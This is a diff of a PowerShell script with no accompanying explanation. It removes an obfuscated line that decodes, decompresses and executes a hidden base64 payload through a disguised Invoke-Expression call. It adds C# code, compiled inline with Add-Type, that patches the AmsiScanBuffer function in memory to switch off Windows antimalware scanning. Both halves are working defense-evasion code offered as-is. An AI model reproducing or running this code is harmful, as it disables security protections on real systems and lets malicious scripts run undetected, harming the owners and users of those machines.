@@ -1,1 +1,48 @@
-( neW-ObjeCt iO.compRESSIOn.dEFlaTeSTream( [System.iO.memOrYSTreAM] [cOnvERT]::FrOMbAsE64StRIng( 'rZVvT9swEMbf51PcIqSkaqjSlY6hqhLljzZEyyrCeDHECze5QIRrR7YDZIjvvrObQkvZtBdEVdKc757nd+412TrHHIYAIXghQJDUQRsCbXAe0RcI4BKVLqQYBtAOdjpxAHTtxJ04gsOKm4rClKVcLg4FVkYxHsG0mvHC5abufIq1zQwu5J29p1wxnO3usn7a/+ICEHT3ejsYf3XpewG0ogVP0A4IyRF1zithMUzh7ObYOREGlSwTVPdFii6qI6D0S3Q6yjXj8B29A3cgC3r1Fjl1GqdoXYnVUjqh2Pr28r6rzXcXXefdbtaPWY9RSsujj7eVyEqlCGB3dN/3Kl2IG0hqSz9Yu7O9mGKjBT3wPMHmqEtGMgd1ybT2njwShNLxQcopBKNJcuKiizV7XB1xfjIvpTKhf4dKIO999lvXL+tNvTbM0AUfyVYAuU+Ngm9opkqmoyxTqHXYRG8nMqs4RlSjLHlJKWcE1xp8iOlYsmxczBRTddg4iA9Qn0nJ4bJQpmKcmjKYmmVDvGw6jOBnE8oekuI3tVgVwkDOz/ChqYlAVmYR5mXOf/CsWSC+dwFPG8BOxrkfwbEwqp5KWz8E/9zwibzHCc6lqmk1QTNm2hwrJRWt54xrXGlsvaN7WWTwWr7sJkNNlM2NVmkE1kxTO6uI63tkM44KzWYcw9ZLzusQ2aNRvGDqBs3ReEx8qz+Vz+a6cE2u/FL2KHIIV4qGjVDnF813C55AIf3hBHQH8Oy9ZzhKDuxl+HYaXzQj8Efk7dOfz09SJtyXgyrPUb3HstT7f5D1oSCSsIm0+uvybiysHOXEA2/D+tOb+VugRC/TFj/uxIsBc0z/hDqoDV5dw5SZ9Jbsnqi417USeW7PezE8D97bzkrMmWA3mLkhRLuxE6b0LeOdEecy/f6NyxnjYe/N1i2TDmVZh86VbKINuQg2Cl8ntNn6NvHFcXf2t+q18mYD4lfRZ29xfvb8fc+jcdi+qEuEbXpjoUKRYjbSGuc036hhy77HXMIR5oUoDD31Yfk83h4zcVORPxwmt0yV3h8=' ), [io.COMpressiON.ComPreSSIonmode]::decOMpRESs ) |forEAch-OBJECT{neW-ObjeCt  SySteM.iO.STreAmrEAdEr($_ ,[sYsteM.texT.EncodInG]::ascii )} | foREaCH-objECt{ $_.ReADToeND( )} ) |.((geT-variaBlE '*MDr*').nAmE[3,11,2]-join'')
+$Ref =  ( 
+(  'Sy'+ 'stem,'+  ' Version=' +'4.0'  +'.0.0, Cultu' +  'r'+  'e=neutral, Publi'  +'c'  +'Key' + 'Tok'  + 'en=b77a5c56'  +  '1934e08'  +'9' ),
+(  'S'+'y'+'stem.Run' +'ti'+  'me.InteropService'+  's, '+'Ve'  +'r'+ 'sion='+'4.0.0.0,' + ' Culture=neutral, Public'+  'Ke'+'yToken=b'  +'0' +'3f5' + 'f7' +  'f11d50a3a'  )
+ )
+
+$Source   =  @"
+using System;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    public class AMSI
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        public static int Disable()
+        {
+            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            if (TargetDLL == IntPtr.Zero) { return 1; }
+
+            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            if (ASBPtr == IntPtr.Zero) { return 1; }
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+
+            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
+
+            Byte[] Patch = { 0x31, 0xff, 0x90 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
+
+            return 0;
+        }
+    }
+}
+"@
+
+Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
